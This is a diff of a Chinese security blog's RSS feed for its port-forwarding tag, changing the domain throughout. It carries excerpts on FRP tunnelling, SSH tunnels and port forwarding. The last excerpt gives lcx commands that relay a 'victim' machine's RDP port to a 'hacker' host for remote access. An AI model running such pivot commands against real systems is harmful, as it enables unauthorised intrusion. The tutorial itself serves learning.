@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>端口转发 on Reber's Blog</title><link>https://wyb0.com/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</link><description>Recent content in 端口转发 on Reber's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Tue, 30 Jul 2019 23:27:54 +0000</lastBuildDate><atom:link href="https://wyb0.com/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.xml" rel="self" type="application/rss+xml"/><item><title>FRP 内网穿透</title><link>https://wyb0.com/posts/2019/frp-intranet-through/</link><pubDate>Tue, 30 Jul 2019 23:27:54 +0000</pubDate><guid>https://wyb0.com/posts/2019/frp-intranet-through/</guid><description>&lt;h3 id="0x00-对外提供简单的文件访问服务">0x00 对外提供简单的文件访问服务&lt;/h3>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>端口转发 on Reber's Blog</title><link>https://wyb0.cn/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</link><description>Recent content in 端口转发 on Reber's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Tue, 30 Jul 2019 23:27:54 +0000</lastBuildDate><atom:link href="https://wyb0.cn/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.xml" rel="self" type="application/rss+xml"/><item><title>FRP 内网穿透</title><link>https://wyb0.cn/posts/2019/frp-intranet-through/</link><pubDate>Tue, 30 Jul 2019 23:27:54 +0000</pubDate><guid>https://wyb0.cn/posts/2019/frp-intranet-through/</guid><description>&lt;h3 id="0x00-对外提供简单的文件访问服务">0x00 对外提供简单的文件访问服务&lt;/h3>
 &lt;ul>
 &lt;li>服务端&lt;/li>
 &lt;/ul>
@@ -78,7 +78,7 @@ test_static_file]
 2019/07/30 23:32:38 [I] [proxy_manager.go:137] [ce144f7511f63353] proxy added: [
 rdp]
 2019/07/30 23:32:38 [I] [control.go:144] [rdp] start proxy success
-&lt;/code>&lt;/pre>&lt;p>这里其实可以把 frp 做成服务，开机自启动的那种&lt;/p></description></item><item><title>SSH 免密登录及 SSH 隧道</title><link>https://wyb0.com/posts/2016/linux-ssh-connect/</link><pubDate>Wed, 10 Aug 2016 11:46:13 +0000</pubDate><guid>https://wyb0.com/posts/2016/linux-ssh-connect/</guid><description>&lt;h3 id="0x00-ssh相关选项">0x00 SSH相关选项&lt;/h3>
+&lt;/code>&lt;/pre>&lt;p>这里其实可以把 frp 做成服务，开机自启动的那种&lt;/p></description></item><item><title>SSH 免密登录及 SSH 隧道</title><link>https://wyb0.cn/posts/2016/linux-ssh-connect/</link><pubDate>Wed, 10 Aug 2016 11:46:13 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-ssh-connect/</guid><description>&lt;h3 id="0x00-ssh相关选项">0x00 SSH相关选项&lt;/h3>
 &lt;ul>
 &lt;li>
 &lt;p>-V 显示版本&lt;/p>
@@ -90,7 +90,7 @@ rdp]
 &lt;p>-N 不执行远程命令，一般与-f连用，用于端口转发&lt;/p>
 &lt;/li>
 &lt;li>
-&lt;p>-C 压缩传输的数据，网速快时会影响速度&lt;/p></description></item><item><title>端口转发</title><link>https://wyb0.com/posts/2016/port-forwarding/</link><pubDate>Mon, 08 Aug 2016 19:33:45 +0000</pubDate><guid>https://wyb0.com/posts/2016/port-forwarding/</guid><description>&lt;h3 id="0x00-应用场景">0x00 应用场景&lt;/h3>
+&lt;p>-C 压缩传输的数据，网速快时会影响速度&lt;/p></description></item><item><title>端口转发</title><link>https://wyb0.cn/posts/2016/port-forwarding/</link><pubDate>Mon, 08 Aug 2016 19:33:45 +0000</pubDate><guid>https://wyb0.cn/posts/2016/port-forwarding/</guid><description>&lt;h3 id="0x00-应用场景">0x00 应用场景&lt;/h3>
 &lt;ul>
 &lt;li>内网IP的80端口通过端口映射到了外网IP的80端口上&lt;/li>
 &lt;li>内网的Web服务器通过外网IP反向代理(如Nginx)
@@ -116,7 +116,7 @@ rdp]
 &lt;li>Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389&lt;/li>
 &lt;li>Hacker：cmd mstsc hacker_ip:500&lt;/li>
 &lt;/ul>
-&lt;p>&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_hacker_run_lcx.png" alt="hacker运行lcx">
-&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_vimctim_run_lcx.png" alt="vimctim端运行lcx">
-&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_hacker_remote_conn.png" alt="hacker远程连接">
-&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_hacker_remote_conn_success.png" alt="hacker远程连接成功">&lt;/p></description></item></channel></rss>
+&lt;p>&lt;img src="https://wyb0.cn/img/post/privilge_escalation_win_hacker_run_lcx.png" alt="hacker运行lcx">
+&lt;img src="https://wyb0.cn/img/post/privilge_escalation_win_vimctim_run_lcx.png" alt="vimctim端运行lcx">
+&lt;img src="https://wyb0.cn/img/post/privilge_escalation_win_hacker_remote_conn.png" alt="hacker远程连接">
+&lt;img src="https://wyb0.cn/img/post/privilge_escalation_win_hacker_remote_conn_success.png" alt="hacker远程连接成功">&lt;/p></description></item></channel></rss>
